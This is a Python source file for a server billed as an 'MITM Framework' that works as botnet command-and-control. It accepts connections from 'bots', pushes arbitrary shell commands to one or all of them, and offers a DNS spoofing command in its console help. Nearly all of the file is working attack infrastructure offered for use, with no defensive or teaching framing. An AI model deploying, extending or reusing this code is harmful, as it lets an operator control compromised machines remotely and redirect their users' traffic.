#!/usr/bin/env python


'''
MITM Framework Server


Features:

* Provide framework to allow Socket Communication to Clients
* Push Commands to Clients
* Hosts a HTTP Service to host Graphical Management UI

* Dependancies:

* SimpleWebSocketServer
* BaseHTTPServer

@author: Chandra Majumdar
         Colin Goss 

'''

import os
import threading
from SimpleWebSocketServer import SimpleWebSocketServer, WebSocket
import sys, os, re, shutil, json, urllib, urllib2, BaseHTTPServer
# import ptvsd
# ptvsd.enable_attach()
# ptvsd.wait_for_attach()


reload(sys)
sys.setdefaultencoding('utf8')
cnc_connections = list()


active_connections = list()
here = os.path.dirname(os.path.realpath(__file__))

'''
Class:              WS_Collector
Description:        This class is used to marshal commands and responses to and from client 
                    connections to the management interface formatted as a json object.
'''
class WS_Collector(WebSocket):

    def handleMessage(self):
        print active_connections.index(self)
        print self.data
        new_message = {
                        "response": "botOutput",
                        "id" : active_connections.index(self),
                        "address" : self.address[0],
                        "message" : self.data
                        }
        for cnc in cnc_connections:
            cnc.sendMessage(json.dumps(new_message))

    def handleConnected(self):
        print(self.address, 'connected')
        active_connections.append(self)
        new_message = {
                        "response": "botConnect",
                        "id" : active_connections.index(self),
                        "address" : self.address[0]
                        }
        for cnc in cnc_connections:
            cnc.sendMessage(json.dumps(new_message))
        pass

    def handleClose(self):
        print(self.address, 'closed')
        
        new_message = {
                        "response": "botDisconnect",
                        "id" : active_connections.index(self),
                        "address" : self.address[0]
                        }
        active_connections.remove(self)
        for cnc in cnc_connections:
            cnc.sendMessage(json.dumps(new_message))
        pass


"""
Class:              WS_Web
Description:        This class hosts the socket communication for the management UI. All responses
                    from the client will be proxied through this class to all connected through the 
                    management UI. 
                    The methods contained within this class are presentation layer methods and used
                    to either list all connected clients or marshal commands to the connected clients.
"""
class WS_Web(WebSocket):

    def command(command,self):
        active_connections[command["id"]].sendMessage(command["command"])
        print "Command"

    def list_bots(command,self):
        print "List_Bots"
        listof_bots  = list()
        for bot in active_connections:
            new_bot = {
            "id" : active_connections.index(bot),
            "address" : bot.address[0]
            }
            listof_bots.append(new_bot)
        response = {
               "response": "list_of_bots",
               "bot_list": listof_bots
        }
        self.sendMessage(json.dumps(response))

    def close_bot(command,self):
        active_connections[command["id"]].sendMessage(command["command"])
        print "close_bot"
 
    def broadcast(command,self):
        for bot in active_connections:
            bot.sendMessage(command["command"])
        print "broadcast"

    def serverCommand(command,self):
        print "Server Command"

    def shutdown_server(command,self):
        """
        Method:         shutdown_server(command,self)
        Parameters:     
                        command: json Command object{id:(clientid:int),command:(command to run:text)}                       
                        self: "self" explanatory, used for instance reference to internal properties and methods

        Description:    sends the command to shutdown to all connected bots and terminates the server process
        """
        print "Shutdown requested"
        for bot in active_connections:
            bot.sendMessage("XXX")
        new_message = {
                        "response": "serverOutput",
                        "message" : "Server Shutdown ..."
                        }
        self.sendMessage(json.dumps(new_message))
        os._exit(0)


    switcher = {
        "command":command,
        "list_bots":list_bots,
        "close_bot":close_bot,
        "shutdown_server":shutdown_server,
        "broadcast":broadcast,
        "serverCommand":serverCommand
    }

    def process_command(self, command):
        """
        Method:         process_command(self,command)
        Parameters:     
                                               
                        self: "self" explanatory, used for instance reference to internal properties and methods
                        command: json Command object{id:(clientid:int),command:(command to run:text),action:(action to be performed must be within switcher:text)}

        Description:    This method performs an implementation of switch functionality executing the function found within the command "action" property.
                        
        """
        func = self.switcher.get(command["action"])
        return func(command,self)

    def handleMessage(self):
        print self.data
        #parse command and execute.
        cnc_command = json.loads(self.data)
        self.process_command(cnc_command)


    def handleConnected(self):
        print(self.address, 'connected')
        cnc_connections.append(self)
        #self.list_bots(None,self)
        #send list of bots
        listof_bots  = list()
        for bot in active_connections:
            new_bot = {
            "id" : active_connections.index(bot),
            "address" : bot.address[0]
            }
            listof_bots.append(new_bot)
        self.sendMessage(json.dumps(listof_bots))
        pass

    def handleClose(self):
        print(self.address, 'closed')
        cnc_connections.remove(self)
        pass


def CMDInterface():
    try:
        while True:
            cmd = raw_input("Command:")
            if cmd == "?":
                print "Bots Online:\t", str(len(active_connections))
                print "i for bot list"
                print "x to terminate c2"
                print "cmd=XXX to terminate all bots"
                print "cmd=0_XXX to terminate botid == 0"
                print "cmd=0_spoofdns=google.com:1.2.3.4"
            if cmd == "i":
                print "Bots details:\n"
                for bot in active_connections:
                    print bot.address[0]
            if cmd == "x":
                print "Shutting down server...\n"
                os._exit(0)
            if cmd.startswith("cmd="):
                # parse command and bot id
                # string format cmd=botid_command with args
                # cmd=0_spoofdns=google.com:192.168.0.1
                command = cmd.strip("cmd=").split('_')
                if len(command) == 2:
                    active_connections[int(command[0])].sendMessage(command[1])
                elif len(command) == 1:
                    for bot in active_connections:
                        bot.sendMessage(command[0])
                else:
                    print "Invalid command syntax"
                    print "example:", "cmd=0_ls -l"
                    print "example:", "cmd=ls -l"
    except KeyboardInterrupt:
        raise


#======================================HTTP REST SERVER =========================================
#adapted from https://gist.github.com/tliron/8e9757180506f25e46d9

def rest_call_json(url, payload=None, with_payload_method='PUT'):
    'REST call with JSON decoding of the response and JSON payloads'
    if payload:
        if not isinstance(payload, basestring):
            payload = json.dumps(payload)
        # PUT or POST
        response = urllib2.urlopen(MethodRequest(url, payload, {'Content-Type': 'application/json'}, method=with_payload_method))
    else:
        # GET
        response = urllib2.urlopen(url)
    response = response.read().decode()
    return json.loads(response)

class MethodRequest(urllib2.Request):
    'See: https://gist.github.com/logic/2715756'
    def __init__(self, *args, **kwargs):
        if 'method' in kwargs:
            self._method = kwargs['method']
            del kwargs['method']
        else:
            self._method = None
        return urllib2.Request.__init__(self, *args, **kwargs)

    def get_method(self, *args, **kwargs):
        return self._method if self._method is not None else urllib2.Request.get_method(self, *args, **kwargs)

class RESTRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.routes = {
            r'^/$': {'file': 'web/index.html', 'media_type': 'text/html'},
            # r'^/connections$': {'GET': get_connections, 'PUT': set_connections, 'media_type': 'application/json'},
            # r'^/connection/': {'GET': get_connection, 'PUT': set_connection, 'POST': set_connection,'DELETE': delete_connection, 'media_type': 'application/json'}
            }
        
        return BaseHTTPServer.BaseHTTPRequestHandler.__init__(self, *args, **kwargs)
    
    def do_HEAD(self):
        self.handle_method('HEAD')
    
    def do_GET(self):
        self.handle_method('GET')

    def do_POST(self):
        self.handle_method('POST')

    def do_PUT(self):
        self.handle_method('PUT')

    def do_DELETE(self):
        self.handle_method('DELETE')
    
    def get_payload(self):
        payload_len = int(self.headers.getheader('content-length', 0))
        payload = self.rfile.read(payload_len)
        payload = json.loads(payload)
        return payload
        
    def handle_method(self, method):
        route = self.get_route()
        if route is None:
            self.send_response(404)
            self.end_headers()
            self.wfile.write('Route not found\n')
        else:
            if method == 'HEAD':
                self.send_response(200)
                if 'media_type' in route:
                    self.send_header('Content-type', route['media_type'])
                self.end_headers()
            else:
                if 'file' in route:
                    if method == 'GET':
                        try:
                            f = open(os.path.join(here, route['file']))
                            try:
                                self.send_response(200)
                                if 'media_type' in route:
                                    self.send_header('Content-type', route['media_type'])
                                self.end_headers()
                                shutil.copyfileobj(f, self.wfile)
                            finally:
                                f.close()
                        except:
                            self.send_response(404)
                            self.end_headers()
                            self.wfile.write('File not found\n')
                    else:
                        self.send_response(405)
                        self.end_headers()
                        self.wfile.write('Only GET is supported\n')
                else:
                    if method in route:
                        content = route[method](self)
                        if content is not None:
                            self.send_response(200)
                            if 'media_type' in route:
                                self.send_header('Content-type', route['media_type'])
                            self.end_headers()
                            if method != 'DELETE':
                                self.wfile.write(json.dumps(content))
                        else:
                            self.send_response(404)
                            self.end_headers()
                            self.wfile.write('Not found\n')
                    else:
                        self.send_response(405)
                        self.end_headers()
                        self.wfile.write(method + ' is not supported\n')
                    
    
    def get_route(self):
        for path, route in self.routes.iteritems():
            if re.match(path, self.path):
                return route
        return None


#====================================END HTTP REST SERVER =====================================

def RunServer():
    try:
        server = SimpleWebSocketServer('', 8080, WS_Collector)
        server.serveforever()
    except KeyboardInterrupt:
        raise
    print 'Stopping Client Socket server'

def RunCNCServer():
    try:
        server = SimpleWebSocketServer('', 8083, WS_Web)
        server.serveforever()
    except KeyboardInterrupt:
        raise
    print 'Stopping CNC server'

def rest_web_server():
    'Starts the REST server'
    port = 8081
    http_server = BaseHTTPServer.HTTPServer(('', port), RESTRequestHandler)
    print 'Starting HTTP server at port %d' % port
    try:
        http_server.serve_forever()
    except KeyboardInterrupt:
        http_server.server_close()
        raise
    print 'Stopping HTTP server'
    http_server.server_close()

def main():
    """
    Starts the essential services for the MITM Framework on several threads. 
    """
    try:
        # Start the Client Web Socket
        ws_t = threading.Thread(name="ws_server", target=RunServer)
        ws_t.start()
        # Start the CNC Web Socket Server
        wscnc_t = threading.Thread(name="ws_cncserver", target=RunCNCServer)
        wscnc_t.start()
        # Start the Rest Web Server
        rest_t = threading.Thread(name="rest_web_server",target=rest_web_server)
        rest_t.start()
        # Start the Command Line Interface
        cmd_t = threading.Thread(name="ui_server", target=CMDInterface)
        cmd_t.start()
        cmd_t.join()
        ws_t.join()
        rest_t.join()
    except KeyboardInterrupt:
        raise


main()